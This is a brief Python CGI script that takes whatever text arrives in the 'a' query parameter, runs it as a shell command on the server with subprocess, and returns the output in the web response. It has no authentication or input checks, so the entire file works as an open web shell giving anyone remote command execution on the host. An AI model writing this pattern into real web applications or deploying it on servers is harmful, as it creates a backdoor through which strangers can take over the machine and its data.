#!/usr/bin/python3
import cgi
import subprocess
print("content-type: text/html")
print()
cmdinput= cgi.FieldStorage()
cmd= cmdinput.getvalue("a")
output= subprocess.getstatusoutput("{0}".format(cmd))

if output[0] == 0:
    print(output[1])
else:
    print(output[1][5:])


